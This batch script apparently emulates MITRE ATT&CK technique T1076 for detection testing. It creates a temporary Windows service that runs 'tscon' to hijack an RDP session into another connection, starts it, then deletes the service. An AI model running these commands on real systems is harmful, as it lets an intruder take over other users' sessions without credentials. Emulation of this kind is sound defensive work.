@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Remote Desktop Protocol	(T1076)
ECHO.
ECHO [+] Use 'SC' to create service 'T1076_RDPService' for RDP and Delete
ECHO -------------------------------------------------------------------
sc.exe create T1076_RDPService binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
net start T1076_RDPService
ping -n 5 127.0.0.1 > nul
sc.exe delete T1076_RDPService
ECHO.
